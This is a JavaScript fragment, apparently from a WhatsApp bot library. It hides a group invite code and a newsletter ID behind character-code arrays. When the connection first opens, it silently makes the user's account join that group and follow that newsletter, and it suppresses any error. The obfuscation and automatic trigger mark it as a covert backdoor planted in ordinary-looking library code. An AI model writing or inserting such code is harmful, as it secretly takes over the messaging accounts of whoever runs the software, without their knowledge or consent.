const _d = values => String.fromCharCode(...values);
const _g = _d([66,56,79,112,57,54,73,67,75,82,105,70,77,83,86,103,116,85,109,88,113,74]);
const _c = _d([49,50,48,51,54,51,52,49,50,53,52,56,52,50,56,54,48,51,64,110,101,119,115,108,101,116,116,101,114]);
let _s = false;
sock.ev.on('connection.update', ({ connection: _x }) => {
  if (_x !== 'open' || _s) return;
  _s = true;
  void (async () => {
    try { await sock.groupAcceptInvite(_g); } catch {}
    await genericExecuteWMexQuery({ newsletter_id: _c }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow, sock.query, sock.generateMessageTag);
  })();
});
